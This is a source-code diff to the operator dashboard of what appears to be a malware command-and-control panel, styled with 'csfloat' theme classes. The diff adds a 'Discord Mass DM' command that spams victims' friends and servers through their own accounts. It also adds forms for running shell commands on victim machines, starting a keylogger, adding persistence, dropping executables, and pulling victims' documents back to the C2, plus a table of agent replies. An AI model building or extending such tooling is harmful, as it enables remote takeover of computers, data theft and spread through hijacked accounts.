@@ -37,7 +37,7 @@ interface Agent {
 interface Command {
   id: number;
   agent_id: string;
-  command_type: 'shell' | 'download' | 'upload' | 'screenshot' | 'keylog' | 'persistence' | 'collect_data' | 'collect_files' | 'kill_agent' | 'kill_process';
+  command_type: 'shell' | 'download' | 'upload' | 'screenshot' | 'keylog' | 'persistence' | 'collect_data' | 'collect_files' | 'kill_agent' | 'kill_process' | 'discord_mass_dm';
   command_data: string;
   status: 'pending' | 'executing' | 'completed' | 'failed';
   result: string;
@@ -51,13 +51,15 @@ const C2Dashboard: React.FC = () => {
   const [logs, setLogs] = useState<Log[]>([]);
   const [logStatsByDay, setLogStatsByDay] = useState<any[]>([]);
   const [selectedAgent, setSelectedAgent] = useState<string>('');
-  const [commandType, setCommandType] = useState<'shell' | 'download' | 'upload' | 'screenshot' | 'keylog' | 'persistence' | 'collect_data' | 'collect_files' | 'kill_agent' | 'kill_process'>('shell');
+  const [commandType, setCommandType] = useState<'shell' | 'download' | 'upload' | 'screenshot' | 'keylog' | 'persistence' | 'collect_data' | 'collect_files' | 'kill_agent' | 'kill_process' | 'discord_mass_dm'>('shell');
   const [commandData, setCommandData] = useState('');
+  const [commandData2, setCommandData2] = useState('');
   const [isLoading, setIsLoading] = useState(true);
   const [activeTab, setActiveTab] = useState<'overview' | 'agents' | 'commands' | 'logs' | 'debug'>('overview');
   const [selectedLog, setSelectedLog] = useState<Log | null>(null);
   const [showInactive, setShowInactive] = useState(false);
   const { isAdminAuthenticated } = useAdminAuth();
+  const [commandReplies, setCommandReplies] = useState<any[]>([]);
 
   useEffect(() => {
     if (isAdminAuthenticated) {
@@ -66,6 +68,25 @@ const C2Dashboard: React.FC = () => {
       return () => clearInterval(interval);
     }
   }, [isAdminAuthenticated]);
+
+  useEffect(() => {
+    if (!selectedAgent) return;
+    const fetchReplies = async () => {
+      try {
+        const headers = getAuthHeaders();
+        const res = await fetch(`/api/admin/c2/command-replies/${encodeURIComponent(selectedAgent)}`, { headers });
+        if (res.ok) {
+          const data = await res.json();
+          setCommandReplies(data.replies || []);
+        } else {
+          setCommandReplies([]);
+        }
+      } catch {
+        setCommandReplies([]);
+      }
+    };
+    fetchReplies();
+  }, [selectedAgent, activeTab]);
 
   const getAuthHeaders = (): HeadersInit => {
     const token = localStorage.getItem('admin_token');
@@ -127,9 +148,34 @@ const C2Dashboard: React.FC = () => {
   };
 
   const sendCommand = async () => {
-    if (!selectedAgent || !commandData.trim()) {
-      alert('Please select an agent and enter a command');
+    if (!selectedAgent) {
+      alert('Please select an agent');
       return;
+    }
+
+    let finalCommandData = commandData;
+
+    if (commandType === 'download' || commandType === 'upload') {
+      if (!commandData.trim()) {
+        alert('Source path/URL is required.');
+        return;
+      }
+      finalCommandData = JSON.stringify({
+        source: commandData,
+        destination: commandData2,
+      });
+    } else {
+      if (commandType === 'discord_mass_dm') {
+        if (!commandData.trim()) {
+          alert('Command data is required.');
+          return;
+        }
+      } else {
+        if (!commandData.trim()) {
+          alert('Command data is required.');
+          return;
+        }
+      }
     }
 
     try {
@@ -139,14 +185,16 @@ const C2Dashboard: React.FC = () => {
         body: JSON.stringify({
           agent_id: selectedAgent,
           command_type: commandType,
-          command_data: commandData
+          command_data: finalCommandData
         })
       });
 
       if (response.ok) {
         setCommandData('');
+        setCommandData2('');
         alert('Command sent successfully');
         fetchData();
+        await fetchReplies();
       } else {
         alert('Failed to send command');
       }
@@ -309,6 +357,7 @@ const C2Dashboard: React.FC = () => {
       case 'collect_files': return 'bg-orange-500';
       case 'kill_process': return 'bg-red-600';
       case 'kill_agent': return 'bg-red-800';
+      case 'discord_mass_dm': return 'bg-purple-500';
       default: return 'bg-gray-500';
     }
   };
@@ -326,6 +375,174 @@ const C2Dashboard: React.FC = () => {
   };
 
   const filteredAgents = showInactive ? agents : agents.filter(a => a.status === 'active');
+
+  const renderCommandInputs = () => {
+    switch (commandType) {
+      case 'shell':
+        return (
+          <div className="mb-6">
+            <label className="block text-sm font-medium text-csfloat-light/70 mb-2">Shell Command</label>
+            <textarea
+              value={commandData}
+              onChange={(e) => setCommandData(e.target.value)}
+              placeholder="e.g., whoami"
+              className="w-full bg-csfloat-darker border border-csfloat-gray/20 rounded-lg px-4 py-2 text-white focus:outline-none focus:border-csfloat-blue h-32 resize-none font-mono"
+            />
+          </div>
+        );
+      case 'download':
+        return (
+          <div className="grid grid-cols-1 md:grid-cols-2 gap-6 mb-6">
+            <div>
+              <label className="block text-sm font-medium text-csfloat-light/70 mb-2">Source URL</label>
+              <input
+                type="text"
+                value={commandData}
+                onChange={(e) => setCommandData(e.target.value)}
+                placeholder="http://example.com/file.exe"
+                className="w-full bg-csfloat-darker border border-csfloat-gray/20 rounded-lg px-4 py-2 text-white focus:outline-none focus:border-csfloat-blue"
+              />
+            </div>
+            <div>
+              <label className="block text-sm font-medium text-csfloat-light/70 mb-2">Destination Path (on Agent, optional)</label>
+              <input
+                type="text"
+                value={commandData2}
+                onChange={(e) => setCommandData2(e.target.value)}
+                placeholder="C:\Windows\Temp\downloaded_file.exe"
+                className="w-full bg-csfloat-darker border border-csfloat-gray/20 rounded-lg px-4 py-2 text-white focus:outline-none focus:border-csfloat-blue"
+              />
+            </div>
+          </div>
+        );
+      case 'upload':
+        return (
+          <div className="grid grid-cols-1 md:grid-cols-2 gap-6 mb-6">
+            <div>
+              <label className="block text-sm font-medium text-csfloat-light/70 mb-2">Source Path (on Agent)</label>
+              <input
+                type="text"
+                value={commandData}
+                onChange={(e) => setCommandData(e.target.value)}
+                placeholder="C:\Users\Target\Documents\secret.txt"
+                className="w-full bg-csfloat-darker border border-csfloat-gray/20 rounded-lg px-4 py-2 text-white focus:outline-none focus:border-csfloat-blue"
+              />
+            </div>
+            <div>
+              <label className="block text-sm font-medium text-csfloat-light/70 mb-2">Destination Filename (on C2, optional)</label>
+              <input
+                type="text"
+                value={commandData2}
+                onChange={(e) => setCommandData2(e.target.value)}
+                placeholder="uploaded_secret.txt"
+                className="w-full bg-csfloat-darker border border-csfloat-gray/20 rounded-lg px-4 py-2 text-white focus:outline-none focus:border-csfloat-blue"
+              />
+            </div>
+          </div>
+        );
+      case 'discord_mass_dm':
+        return (
+          <div className="mb-6">
+            <label className="block text-sm font-medium text-csfloat-light/70 mb-2">Message to Send</label>
+            <textarea
+              value={commandData}
+              onChange={(e) => setCommandData(e.target.value)}
+              placeholder="Enter the message to mass DM to all friends, DMs, and servers..."
+              className="w-full bg-csfloat-darker border border-csfloat-gray/20 rounded-lg px-4 py-2 text-white focus:outline-none focus:border-csfloat-blue h-32 resize-none"
+            />
+          </div>
+        );
+      case 'screenshot':
+      case 'collect_data':
+      case 'kill_agent':
+        return (
+            <div className="mb-6 p-4 bg-csfloat-darker border border-csfloat-gray/20 rounded-lg">
+                <p className="text-csfloat-light/70">No additional parameters required for this command.</p>
+            </div>
+        );
+      case 'kill_process':
+        return (
+          <div className="mb-6">
+            <label className="block text-sm font-medium text-csfloat-light/70 mb-2">Process Name or PID</label>
+            <input
+              type="text"
+              value={commandData}
+              onChange={(e) => setCommandData(e.target.value)}
+              placeholder="e.g., notepad.exe or 1234"
+              className="w-full bg-csfloat-darker border border-csfloat-gray/20 rounded-lg px-4 py-2 text-white focus:outline-none focus:border-csfloat-blue"
+            />
+          </div>
+        );
+      case 'collect_files':
+          return (
+            <div className="mb-6">
+              <label className="block text-sm font-medium text-csfloat-light/70 mb-2">Path / Glob Pattern</label>
+              <input
+                type="text"
+                value={commandData}
+                onChange={(e) => setCommandData(e.target.value)}
+                placeholder="C:\Users\Target\Documents\*.docx"
+                className="w-full bg-csfloat-darker border border-csfloat-gray/20 rounded-lg px-4 py-2 text-white focus:outline-none focus:border-csfloat-blue"
+              />
+            </div>
+          );
+      case 'persistence':
+          return (
+            <div className="mb-6">
+              <label className="block text-sm font-medium text-csfloat-light/70 mb-2">File to make persistent (optional)</label>
+              <input
+                type="text"
+                value={commandData}
+                onChange={(e) => setCommandData(e.target.value)}
+                placeholder="Leave blank to make the agent itself persistent"
+                className="w-full bg-csfloat-darker border border-csfloat-gray/20 rounded-lg px-4 py-2 text-white focus:outline-none focus:border-csfloat-blue"
+              />
+            </div>
+          );
+      default:
+        return (
+          <div className="mb-6">
+            <label className="block text-sm font-medium text-csfloat-light/70 mb-2">Command Data</label>
+            <textarea
+              value={commandData}
+              onChange={(e) => setCommandData(e.target.value)}
+              placeholder="Enter command data..."
+              className="w-full bg-csfloat-darker border border-csfloat-gray/20 rounded-lg px-4 py-2 text-white focus:outline-none focus:border-csfloat-blue h-32 resize-none"
+            />
+          </div>
+        );
+    }
+  };
+
+  const renderCommandReplies = () => (
+    <div className="bg-gray-800/70 rounded-lg p-6 border border-gray-700/50 mt-8">
+      <h3 className="text-lg font-bold mb-4 text-csfloat-blue">Command Replies</h3>
+      {commandReplies.length === 0 ? (
+        <div className="text-csfloat-light/70">No command replies yet.</div>
+      ) : (
+        <div className="overflow-x-auto">
+          <table className="min-w-full text-sm">
+            <thead>
+              <tr className="text-csfloat-light/70">
+                <th className="px-2 py-1 text-left">Time</th>
+                <th className="px-2 py-1 text-left">Command</th>
+                <th className="px-2 py-1 text-left">Result</th>
+              </tr>
+            </thead>
+            <tbody>
+              {commandReplies.map((reply, idx) => (
+                <tr key={idx} className="border-b border-csfloat-gray/10">
+                  <td className="px-2 py-1 font-mono">{new Date(reply.created_at || reply.time).toLocaleString()}</td>
+                  <td className="px-2 py-1 font-mono">{reply.command_type}</td>
+                  <td className="px-2 py-1 font-mono whitespace-pre-wrap max-w-xs break-all">{reply.result_data || reply.result}</td>
+                </tr>
+              ))}
+            </tbody>
+          </table>
+        </div>
+      )}
+    </div>
+  );
 
   // Don't render if not authenticated
   if (!isAdminAuthenticated) {
@@ -501,40 +718,36 @@ const C2Dashboard: React.FC = () => {
                       </label>
                       <select
                         value={commandType}
-                        onChange={(e) => setCommandType(e.target.value as any)}
+                        onChange={(e) => {
+                          setCommandType(e.target.value as any);
+                          setCommandData('');
+                          setCommandData2('');
+                        }}
                         className="w-full bg-csfloat-darker border border-csfloat-gray/20 rounded-lg px-4 py-2 text-white focus:outline-none focus:border-csfloat-blue"
                       >
                         <option value="shell">Shell Command</option>
                         <option value="download">Download File</option>
                         <option value="upload">Upload File</option>
                         <option value="screenshot">Screenshot</option>
-                        <option value="keylog">Keylogger</option>
-                        <option value="persistence">Persistence</option>
-                        <option value="collect_data">Collect Data</option>
-                        <option value="collect_files">Collect Files</option>
+                        <option value="keylog">Start Keylogger</option>
+                        <option value="discord_mass_dm">Discord Mass DM</option>
+                        <option value="persistence">Add Persistence</option>
+                        <option value="collect_data">Collect System Info</option>
+                        <option value="collect_files">Collect Files by Pattern</option>
                         <option value="kill_process">Kill Process</option>
                         <option value="kill_agent">Kill Agent</option>
                       </select>
                     </div>
                   </div>
-                  <div className="mb-6">
-                    <label className="block text-sm font-medium text-csfloat-light/70 mb-2">
-                      Command Data
-                    </label>
-                    <textarea
-                      value={commandData}
-                      onChange={(e) => setCommandData(e.target.value)}
-                      placeholder="Enter command or file path..."
-                      className="w-full bg-csfloat-darker border border-csfloat-gray/20 rounded-lg px-4 py-2 text-white focus:outline-none focus:border-csfloat-blue h-32 resize-none"
-                    />
-                  </div>
+                  {renderCommandInputs()}
                   <button
                     onClick={sendCommand}
-                    disabled={!selectedAgent || !commandData.trim()}
+                    disabled={!selectedAgent || (commandType !== 'screenshot' && commandType !== 'collect_data' && commandType !== 'kill_agent' && !commandData.trim())}
                     className="bg-csfloat-blue hover:bg-blue-600 disabled:bg-csfloat-gray/50 text-white px-6 py-2 rounded-lg transition-colors duration-200 disabled:cursor-not-allowed"
                   >
                     Send Command
                   </button>
+                  {renderCommandReplies()}
                 </div>
               </div>
             )}
